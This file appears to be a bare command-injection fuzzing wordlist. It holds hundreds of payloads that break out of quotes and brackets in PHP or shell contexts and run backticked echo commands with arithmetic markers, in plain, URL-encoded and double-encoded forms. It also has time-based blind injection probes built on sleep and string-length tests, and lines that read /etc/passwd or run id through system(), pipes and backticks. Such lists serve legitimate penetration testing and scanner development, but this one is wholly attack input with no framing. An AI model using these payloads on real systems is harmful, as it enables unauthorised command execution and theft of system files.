$aaaaaa/bin$bbbbbb/cat$ccccccc $dddddd/etc$eeeeeee/passwd$fffffff
$(`cat /etc/passwd`)
$(`dir`)
$(echo SYCGSY > SYCGSY.txt)
);}print(`echo JRFJOE%0aecho $((92+73))%0aecho JRFJOE%0aecho JRFJOE`);%2523JRFJOE
')print(`echo JUEAPR%0aecho $((30+6))%0aecho JUEAPR%0aecho JUEAPR`);.%2522JUEAPR
);}print(`echo KAJDYV%0aecho $((71+88))%0aecho KAJDYV%0aecho KAJDYV`);KAJDYV
);}print(`echo KAYVRD\necho $((4+54))\necho KAYVRD\necho KAYVRD`);%252529%25257DKAYVRD
);}print(`echo KBRMCR\necho $((41+94))\necho KBRMCR\necho KBRMCR`);.%252527KBRMCR
);}print(`echo KDYDKK\necho $((47+87))\necho KDYDKK\necho KDYDKK`);//KDYDKK
'.print(`echo KFTIEO\necho $((9+66))\necho KFTIEO\necho KFTIEO`);%252529%25257DKFTIEO
'.print(`echo KHHFWC;echo $((15+27));echo KHHFWC;echo KHHFWC`);KHHFWC
");}print(`echo KHRTRY`.`echo $((68+68))`.`echo KHRTRY`.`echo KHRTRY`);//KHRTRY
'.print(`echo KKDSRH`.`echo $((88+16))`.`echo KKDSRH`.`echo KKDSRH`);\\KKDSRH
'print(`echo KKQSRA`.`echo $((71+76))`.`echo KKQSRA`.`echo KKQSRA`);#KKQSRA
)print(`echo KPLWCF\necho $((96+6))\necho KPLWCF\necho KPLWCF`);//KPLWCF
);}print(`echo KRAWWO`.`echo $((15+36))`.`echo KRAWWO`.`echo KRAWWO`);\\KRAWWO
'.print(`echo KVAVOQ`.`echo $((63+81))`.`echo KVAVOQ`.`echo KVAVOQ`);//KVAVOQ
);}print(`echo KXLAQH`.`echo $((80+88))`.`echo KXLAQH`.`echo KXLAQH`);.'KXLAQH
);}print(`echo KYGLOF`.`echo $((80+87))`.`echo KYGLOF`.`echo KYGLOF`))}KYGLOF
')print(`echo KYHRZA`.`echo $((72+0))`.`echo KYHRZA`.`echo KYHRZA`);KYHRZA
")print(`echo KZZFJE;echo $((74+13));echo KZZFJE;echo KZZFJE`);#KZZFJE
print(`echo LPXWJK;echo $((35+1));echo LPXWJK;echo LPXWJK`);//LPXWJK
");}print(`echo LVFGXD`.`echo $((25+23))`.`echo LVFGXD`.`echo LVFGXD`);."LVFGXD
)print(`echo LXAMNA%0aecho $((68+25))%0aecho LXAMNA%0aecho LXAMNA`);%2523LXAMNA
)print(`echo MADCWE\necho $((88+74))\necho MADCWE\necho MADCWE`);MADCWE
')print(`echo MAOJQM\necho $((57+39))\necho MAOJQM\necho MAOJQM`);%252523MAOJQM
");}print(`echo MDITEG;echo $((51+68));echo MDITEG;echo MDITEG`);.'MDITEG
'.print(`echo MFBKHT%0aecho $((27+47))%0aecho MFBKHT%0aecho MFBKHT`);.%2527MFBKHT
'.print(`echo MFFGYS;echo $((68+25));echo MFFGYS;echo MFFGYS`);."MFFGYS
".print(`echo MFYSPW;echo $((87+75));echo MFYSPW;echo MFYSPW`);#MFYSPW
".print(`echo MGGIBH\necho $((69+4))\necho MGGIBH\necho MGGIBH`);%252529%25257DMGGIBH
".print(`echo MKBEZC\necho $((61+47))\necho MKBEZC\necho MKBEZC`);//MKBEZC
'print(`echo MKGGZP`.`echo $((69+92))`.`echo MKGGZP`.`echo MKGGZP`);."MKGGZP
'print(`echo MLMZKH`.`echo $((30+25))`.`echo MLMZKH`.`echo MLMZKH`))}MLMZKH
")print(`echo MMOCRN%0aecho $((88+99))%0aecho MMOCRN%0aecho MMOCRN`);%2529%257DMMOCRN
');}print(`echo MMQDEE\necho $((77+28))\necho MMQDEE\necho MMQDEE`);%252523MMQDEE
")print(`echo MOHYBU`.`echo $((61+5))`.`echo MOHYBU`.`echo MOHYBU`);\\MOHYBU
");}print(`echo MPXDZZ%0aecho $((78+91))%0aecho MPXDZZ%0aecho MPXDZZ`);.%2522MPXDZZ
);}print(`echo MRPUDM`.`echo $((50+14))`.`echo MRPUDM`.`echo MRPUDM`);#MRPUDM
);}print(`echo MSEKQO;echo $((87+12));echo MSEKQO;echo MSEKQO`);."MSEKQO
);}print(`echo MUNABZ`.`echo $((46+73))`.`echo MUNABZ`.`echo MUNABZ`);//MUNABZ
'print(`echo MURMGO%0aecho $((13+87))%0aecho MURMGO%0aecho MURMGO`);%255C%255CMURMGO
");}print(`echo NAAXBX`.`echo $((38+13))`.`echo NAAXBX`.`echo NAAXBX`);NAAXBX
")print(`echo NBPPTV\necho $((1+63))\necho NBPPTV\necho NBPPTV`);%25255C%25255CNBPPTV
')print(`echo NFASEM`.`echo $((28+31))`.`echo NFASEM`.`echo NFASEM`);//NFASEM
)print(`echo NLOFKT\necho $((26+86))\necho NLOFKT\necho NLOFKT`);%25255C%25255CNLOFKT
)print(`echo NNYPSL`.`echo $((56+33))`.`echo NNYPSL`.`echo NNYPSL`);.'NNYPSL
');}print(`echo NPFNRM;echo $((91+52));echo NPFNRM;echo NPFNRM`);\\NPFNRM
print(`echo NSKJQW;echo $((41+11));echo NSKJQW;echo NSKJQW`);."NSKJQW
");}print(`echo NUVVKA;echo $((27+5));echo NUVVKA;echo NUVVKA`);)}NUVVKA
'.print(`echo NXDUHQ%0aecho $((28+78))%0aecho NXDUHQ%0aecho NXDUHQ`);NXDUHQ
')print(`echo OFKEZB;echo $((35+78));echo OFKEZB;echo OFKEZB`);#OFKEZB
print(`echo OKEJJB%0aecho $((46+60))%0aecho OKEJJB%0aecho OKEJJB`);OKEJJB
print(`echo OSGUGU`.`echo $((64+8))`.`echo OSGUGU`.`echo OSGUGU`);//OSGUGU
);}print(`echo OSKSTF%0aecho $((2+12))%0aecho OSKSTF%0aecho OSKSTF`);.%2527OSKSTF
")print(`echo OTTCBX;echo $((64+75));echo OTTCBX;echo OTTCBX`);OTTCBX
")print(`echo OVQSQG%0aecho $((8+36))%0aecho OVQSQG%0aecho OVQSQG`);//OVQSQG
')print(`echo OXDDYE\necho $((75+92))\necho OXDDYE\necho OXDDYE`);%25255C%25255COXDDYE
")print(`echo OZMQFI`.`echo $((35+9))`.`echo OZMQFI`.`echo OZMQFI`);//OZMQFI
'.print(`echo PFJGQM%0aecho $((86+33))%0aecho PFJGQM%0aecho PFJGQM`);%2529%257DPFJGQM
print(`echo PFLDED;echo $((95+99));echo PFLDED;echo PFLDED`);.'PFLDED
")print(`echo PHKGWS\necho $((9+71))\necho PHKGWS\necho PHKGWS`);PHKGWS
);}print(`echo PJRPBN\necho $((21+16))\necho PJRPBN\necho PJRPBN`);PJRPBN
')print(`echo PMUZEH%0aecho $((73+89))%0aecho PMUZEH%0aecho PMUZEH`);.%2527PMUZEH
".print(`echo POVQEX`.`echo $((96+65))`.`echo POVQEX`.`echo POVQEX`);#POVQEX
")print(`echo PPZHBZ%0aecho $((86+40))%0aecho PPZHBZ%0aecho PPZHBZ`);PPZHBZ
)print(`echo PUEXZN`.`echo $((11+4))`.`echo PUEXZN`.`echo PUEXZN`);//PUEXZN
')print(`echo PWUTCR`.`echo $((0+3))`.`echo PWUTCR`.`echo PWUTCR`);#PWUTCR
".print(`echo PZAGMU\necho $((23+82))\necho PZAGMU\necho PZAGMU`);%25255C%25255CPZAGMU
)print(`echo QADPCR;echo $((51+16));echo QADPCR;echo QADPCR`);)}QADPCR
print(`echo QGZDYY%0aecho $((26+56))%0aecho QGZDYY%0aecho QGZDYY`);%255C%255CQGZDYY
");}print(`echo QHWLWM`.`echo $((41+28))`.`echo QHWLWM`.`echo QHWLWM`);\\QHWLWM
'.print(`echo QLKXYP;echo $((79+46));echo QLKXYP;echo QLKXYP`);\\QLKXYP
");}print(`echo QNFOEE%0aecho $((91+41))%0aecho QNFOEE%0aecho QNFOEE`);%2529%257DQNFOEE
)print(`echo QQGYPS`.`echo $((10+39))`.`echo QQGYPS`.`echo QQGYPS`);\\QQGYPS
')print(`echo QTJEKD\necho $((90+98))\necho QTJEKD\necho QTJEKD`);.%252527QTJEKD
")print(`echo QZFGHE`.`echo $((4+60))`.`echo QZFGHE`.`echo QZFGHE`);.'QZFGHE
");}print(`echo RACXOI`.`echo $((81+11))`.`echo RACXOI`.`echo RACXOI`);#RACXOI
'print(`echo RAZRYE;echo $((84+60));echo RAZRYE;echo RAZRYE`);\\RAZRYE
'.print(`echo RDHTSN`.`echo $((90+44))`.`echo RDHTSN`.`echo RDHTSN`);.'RDHTSN
");}print(`echo RKXNWH%0aecho $((63+75))%0aecho RKXNWH%0aecho RKXNWH`);.%2527RKXNWH
');}print(`echo RNSTSU;echo $((52+2));echo RNSTSU;echo RNSTSU`);RNSTSU
")print(`echo RPOOHR%0aecho $((72+27))%0aecho RPOOHR%0aecho RPOOHR`);%2523RPOOHR
print(`echo RREYBJ`.`echo $((33+25))`.`echo RREYBJ`.`echo RREYBJ`);.'RREYBJ
'print(`echo RRMVOG;echo $((30+37));echo RRMVOG;echo RRMVOG`);)}RRMVOG
')print(`echo RUXOHA`.`echo $((74+92))`.`echo RUXOHA`.`echo RUXOHA`))}RUXOHA
".print(`echo RVELEJ;echo $((74+30));echo RVELEJ;echo RVELEJ`);\\RVELEJ
");}print(`echo RXUKTF\necho $((42+2))\necho RXUKTF\necho RXUKTF`);.%252527RXUKTF
".print(`echo RZWFMA`.`echo $((75+86))`.`echo RZWFMA`.`echo RZWFMA`);\\RZWFMA
')print(`echo SATCYU`.`echo $((51+26))`.`echo SATCYU`.`echo SATCYU`);\\SATCYU
);}print(`echo SCGPHN%0aecho $((41+99))%0aecho SCGPHN%0aecho SCGPHN`);%2529%257DSCGPHN
");}print(`echo SFBDLE\necho $((73+49))\necho SFBDLE\necho SFBDLE`);%252529%25257DSFBDLE
")print(`echo SGRKCG`.`echo $((91+4))`.`echo SGRKCG`.`echo SGRKCG`);."SGRKCG
'.print(`echo SMJBZB%0aecho $((19+71))%0aecho SMJBZB%0aecho SMJBZB`);//SMJBZB
")print(`echo SPKTID;echo $((50+54));echo SPKTID;echo SPKTID`);."SPKTID
")print(`echo SPTGKB`.`echo $((57+66))`.`echo SPTGKB`.`echo SPTGKB`))}SPTGKB
)print(`echo SQLMHW;echo $((75+6));echo SQLMHW;echo SQLMHW`);."SQLMHW
'print(`echo STJAIG%0aecho $((89+81))%0aecho STJAIG%0aecho STJAIG`);//STJAIG
');}print(`echo SVXVYZ`.`echo $((35+1))`.`echo SVXVYZ`.`echo SVXVYZ`))}SVXVYZ
);}print(`echo SWQEIO\necho $((64+42))\necho SWQEIO\necho SWQEIO`);%25255C%25255CSWQEIO
)print(`echo SYVAYV%0aecho $((36+49))%0aecho SYVAYV%0aecho SYVAYV`);//SYVAYV
');}print(`echo TBZBGJ`.`echo $((58+75))`.`echo TBZBGJ`.`echo TBZBGJ`);\\TBZBGJ
");}print(`echo TCCEGQ`.`echo $((87+34))`.`echo TCCEGQ`.`echo TCCEGQ`))}TCCEGQ
');}print(`echo TFOYWK;echo $((13+51));echo TFOYWK;echo TFOYWK`);)}TFOYWK
');}print(`echo TJELNR%0aecho $((81+0))%0aecho TJELNR%0aecho TJELNR`);.%2527TJELNR
'print(`echo TPBMFF%0aecho $((79+13))%0aecho TPBMFF%0aecho TPBMFF`);%2523TPBMFF
'.print(`echo TSTIED;echo $((94+6));echo TSTIED;echo TSTIED`);)}TSTIED
'print(`echo TUDOUK;echo $((63+88));echo TUDOUK;echo TUDOUK`);TUDOUK
print(`echo TVCCND%0aecho $((62+6))%0aecho TVCCND%0aecho TVCCND`);.%2527TVCCND
");}print(`echo TWEYRU;echo $((57+60));echo TWEYRU;echo TWEYRU`);TWEYRU
')print(`echo TYAJKR`.`echo $((73+69))`.`echo TYAJKR`.`echo TYAJKR`);.'TYAJKR
print(`echo UBBYNF%0aecho $((67+26))%0aecho UBBYNF%0aecho UBBYNF`);%2523UBBYNF
".print(`echo UCUISA;echo $((65+31));echo UCUISA;echo UCUISA`);UCUISA
)print(`echo UDBRRF%0aecho $((39+57))%0aecho UDBRRF%0aecho UDBRRF`);%255C%255CUDBRRF
'print(`echo UDOCFL\necho $((86+7))\necho UDOCFL\necho UDOCFL`);.%252522UDOCFL
".print(`echo UFRBLO%0aecho $((1+17))%0aecho UFRBLO%0aecho UFRBLO`);%2529%257DUFRBLO
");}print(`echo UHQKLI`.`echo $((50+4))`.`echo UHQKLI`.`echo UHQKLI`);.'UHQKLI
")print(`echo UKYEKY\necho $((70+74))\necho UKYEKY\necho UKYEKY`);%252523UKYEKY
".print(`echo ULLCKQ\necho $((63+14))\necho ULLCKQ\necho ULLCKQ`);%252523ULLCKQ
")print(`echo ULOIOS\necho $((51+30))\necho ULOIOS\necho ULOIOS`);//ULOIOS
'.print(`echo ULZFRM`.`echo $((96+62))`.`echo ULZFRM`.`echo ULZFRM`);."ULZFRM
'print(`echo UPGYTK;echo $((49+93));echo UPGYTK;echo UPGYTK`);."UPGYTK
');}print(`echo URYEKO`.`echo $((45+57))`.`echo URYEKO`.`echo URYEKO`);#URYEKO
);}print(`echo UTBTBN;echo $((92+40));echo UTBTBN;echo UTBTBN`);UTBTBN
");}print(`echo UTFROF\necho $((67+6))\necho UTFROF\necho UTFROF`);//UTFROF
');}print(`echo UXXDJD\necho $((17+17))\necho UXXDJD\necho UXXDJD`);.%252522UXXDJD
');}print(`echo VBLUSZ%0aecho $((96+95))%0aecho VBLUSZ%0aecho VBLUSZ`);//VBLUSZ
')print(`echo VEMMAU;echo $((59+39));echo VEMMAU;echo VEMMAU`);)}VEMMAU
".print(`echo VFIBZQ;echo $((31+85));echo VFIBZQ;echo VFIBZQ`);.'VFIBZQ
')print(`echo VHLBFA\necho $((78+60))\necho VHLBFA\necho VHLBFA`);%252529%25257DVHLBFA
)print(`echo VIVSXO;echo $((60+28));echo VIVSXO;echo VIVSXO`);VIVSXO
')print(`echo VPYMWX%0aecho $((10+22))%0aecho VPYMWX%0aecho VPYMWX`);%255C%255CVPYMWX
')print(`echo VRYZVO`.`echo $((19+54))`.`echo VRYZVO`.`echo VRYZVO`);."VRYZVO
'.print(`echo VWGDMS`.`echo $((77+11))`.`echo VWGDMS`.`echo VWGDMS`);#VWGDMS
)print(`echo VWOEOC`.`echo $((97+4))`.`echo VWOEOC`.`echo VWOEOC`);VWOEOC
'.print(`echo VXYNWW\necho $((29+16))\necho VXYNWW\necho VXYNWW`);%25255C%25255CVXYNWW
");}print(`echo WCABAY%0aecho $((46+3))%0aecho WCABAY%0aecho WCABAY`);WCABAY
'print(`echo WCPHMV\necho $((3+88))\necho WCPHMV\necho WCPHMV`);%252523WCPHMV
".print(`echo WKFYWT%0aecho $((57+28))%0aecho WKFYWT%0aecho WKFYWT`);//WKFYWT
'.print(`echo WMQCVY;echo $((96+95));echo WMQCVY;echo WMQCVY`);.'WMQCVY
");}print(`echo WQBRFD;echo $((85+53));echo WQBRFD;echo WQBRFD`);\\WQBRFD
print(`echo WQMIIN`.`echo $((36+90))`.`echo WQMIIN`.`echo WQMIIN`);."WQMIIN
'print(`echo WSILLK\necho $((70+70))\necho WSILLK\necho WSILLK`);%25255C%25255CWSILLK
')print(`echo WUCPEY%0aecho $((63+16))%0aecho WUCPEY%0aecho WUCPEY`);%2523WUCPEY
);}print(`echo WVNNUB%0aecho $((6+67))%0aecho WVNNUB%0aecho WVNNUB`);//WVNNUB
print(`echo WZLIFQ`.`echo $((3+42))`.`echo WZLIFQ`.`echo WZLIFQ`))}WZLIFQ
);}print(`echo WZOXHV`.`echo $((36+81))`.`echo WZOXHV`.`echo WZOXHV`);WZOXHV
".print(`echo XBJBDE`.`echo $((48+93))`.`echo XBJBDE`.`echo XBJBDE`);//XBJBDE
")print(`echo XCIHWH%0aecho $((57+90))%0aecho XCIHWH%0aecho XCIHWH`);.%2522XCIHWH
print(`echo XEMHBO%0aecho $((11+24))%0aecho XEMHBO%0aecho XEMHBO`);//XEMHBO
");}print(`echo XILSBL\necho $((74+71))\necho XILSBL\necho XILSBL`);%25255C%25255CXILSBL
".print(`echo XKLFAP%0aecho $((76+43))%0aecho XKLFAP%0aecho XKLFAP`);.%2527XKLFAP
);}print(`echo XMVWXQ%0aecho $((48+88))%0aecho XMVWXQ%0aecho XMVWXQ`);%255C%255CXMVWXQ
')print(`echo XQTSKO\necho $((61+71))\necho XQTSKO\necho XQTSKO`);.%252522XQTSKO
');}print(`echo XREPUI`.`echo $((55+99))`.`echo XREPUI`.`echo XREPUI`);//XREPUI
print(`echo XWPSAV%0aecho $((22+11))%0aecho XWPSAV%0aecho XWPSAV`);%2529%257DXWPSAV
'.print(`echo XYCPFN\necho $((60+62))\necho XYCPFN\necho XYCPFN`);XYCPFN
");}print(`echo XYXNLP\necho $((64+13))\necho XYXNLP\necho XYXNLP`);XYXNLP
'.print(`echo YBQGFX%0aecho $((90+18))%0aecho YBQGFX%0aecho YBQGFX`);%2523YBQGFX
");}print(`echo YDWEZS;echo $((87+70));echo YDWEZS;echo YDWEZS`);//YDWEZS
');}print(`echo YERJDV`.`echo $((3+37))`.`echo YERJDV`.`echo YERJDV`);YERJDV
)print(`echo YIXKKR;echo $((83+25));echo YIXKKR;echo YIXKKR`);.'YIXKKR
)print(`echo YKQUFP\necho $((94+91))\necho YKQUFP\necho YKQUFP`);.%252522YKQUFP
");}print(`echo YSGCAB%0aecho $((76+3))%0aecho YSGCAB%0aecho YSGCAB`);%2523YSGCAB
');}print(`echo YXZEEF;echo $((79+80));echo YXZEEF;echo YXZEEF`);.'YXZEEF
print(`echo ZHAWPM;echo $((18+57));echo ZHAWPM;echo ZHAWPM`);)}ZHAWPM
".print(`echo ZLVKDU`.`echo $((0+22))`.`echo ZLVKDU`.`echo ZLVKDU`))}ZLVKDU
".print(`echo ZTFYUM%0aecho $((56+81))%0aecho ZTFYUM%0aecho ZTFYUM`);.%2522ZTFYUM
);}print(`echo ZXKKBW\necho $((18+93))\necho ZXKKBW\necho ZXKKBW`);%252523ZXKKBW
"& sleep 0 && str=$(echo IUGZRA) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 \\
& sleep 0 && str=$(echo IUGZRA) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 \\
'& sleep 0 && str=$(echo IUGZRA) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 \\
"& sleep 0 && str=$(echo JICOQS) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 
& sleep 0 && str=$(echo JICOQS) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 
'& sleep 0 && str=$(echo JICOQS) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 
"& sleep 0 && str=$(echo UXESAW) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 '
& sleep 0 && str=$(echo UXESAW) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 '
'& sleep 0 && str=$(echo UXESAW) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 '
"& sleep 0 && str=$(echo VZETTM) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 &
& sleep 0 && str=$(echo VZETTM) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 &
'& sleep 0 && str=$(echo VZETTM) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 &
"& sleep 0 && str=$(echo WGVBBV) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 |
& sleep 0 && str=$(echo WGVBBV) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 |
'& sleep 0 && str=$(echo WGVBBV) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 |
"& sleep 0 && str=$(echo XGXYKB) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 "
& sleep 0 && str=$(echo XGXYKB) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 "
'& sleep 0 && str=$(echo XGXYKB) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 "
"& sleep 0 && str=$(echo YQNAJZ) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 //
& sleep 0 && str=$(echo YQNAJZ) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 //
'& sleep 0 && str=$(echo YQNAJZ) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 //
"& sleep 0 && str=$(echo ZYJHAC) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 #
& sleep 0 && str=$(echo ZYJHAC) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 #
'& sleep 0 && str=$(echo ZYJHAC) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 #
"; str=$(echo ASBPAS); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi |
'; str=$(echo ASBPAS); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi |
; str=$(echo ASBPAS); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi |
"; str=$(echo BVJEPJ); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi #
'; str=$(echo BVJEPJ); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi #
; str=$(echo BVJEPJ); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi #
"; str=$(echo DJSHTX); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi //
'; str=$(echo DJSHTX); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi //
; str=$(echo DJSHTX); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi //
"; str=$(echo ERVJHE); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi \\
'; str=$(echo ERVJHE); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi \\
; str=$(echo ERVJHE); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi \\
"; str=$(echo EZCOIE); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi '
'; str=$(echo EZCOIE); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi '
; str=$(echo EZCOIE); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi '
"; str=$(echo IITGSD); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi &
'; str=$(echo IITGSD); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi &
; str=$(echo IITGSD); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi &
"; str=$(echo NSANUP); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi 
'; str=$(echo NSANUP); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi 
; str=$(echo NSANUP); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi 
"; str=$(echo UEOOZQ); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi "
'; str=$(echo UEOOZQ); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi "
; str=$(echo UEOOZQ); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi "
;system('cat /etc/passwd')
system('cat /etc/passwd');
;system('id')
;system('/usr/bin/id')
;|/usr/bin/id|
`/usr/bin/id`
|/usr/bin/id
|/usr/bin/id|
||/usr/bin/id;
||/usr/bin/id|
;/usr/bin/id\n
|usr/bin/id\n
